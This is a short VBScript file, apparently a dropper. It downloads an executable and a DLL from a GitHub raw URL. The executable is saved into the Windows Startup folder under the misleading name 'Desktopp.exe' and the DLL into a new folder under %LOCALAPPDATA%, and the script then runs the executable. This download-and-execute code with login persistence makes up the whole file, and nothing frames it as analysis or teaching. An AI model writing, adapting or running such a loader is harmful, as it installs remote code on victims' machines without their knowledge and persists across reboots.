Dim url1, url2, destination1, destination2
url1 = "https://github.com/geoffary/Downloader/raw/main/PrankMessage_MS.exe"  ' Replace with the actual URL of the first file you want to download
url2 = "https://github.com/geoffary/Downloader/raw/main/Ghelloworld.dll"  ' Replace with the actual URL of the second file you want to download

Set objShell = CreateObject("WScript.Shell")
startupFolder = objShell.SpecialFolders("Startup")
destination1 = startupFolder & "\Desktopp.exe"

Set objFSO = CreateObject("Scripting.FileSystemObject")
appDataFolder = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
folderPath = appDataFolder & "\downloading"

' Create the new folder
If Not objFSO.FolderExists(folderPath) Then
    objFSO.CreateFolder(folderPath)
End If

destination2 = folderPath & "\Ghelloworld.dll"

Dim objHTTP, objStream
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")

' Download the first file
objHTTP.Open "GET", url1, False
objHTTP.Send

If objHTTP.Status = 200 Then ' HTTP status code 200 means success
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1 ' Binary
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile destination1, 2 ' Overwrite the existing file
    objStream.Close
    Set objStream = Nothing
End If

' Download the second file
Set objStream = CreateObject("ADODB.Stream")
objHTTP.Open "GET", url2, False
objHTTP.Send

If objHTTP.Status = 200 Then ' HTTP status code 200 means success
    objStream.Open
    objStream.Type = 1 ' Binary
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile destination2, 2 ' Overwrite the existing file
    objStream.Close
    Set objStream = Nothing

    ' Run the downloaded executable
    objShell.Run """" & destination1 & """"
End If

Set objHTTP = Nothing
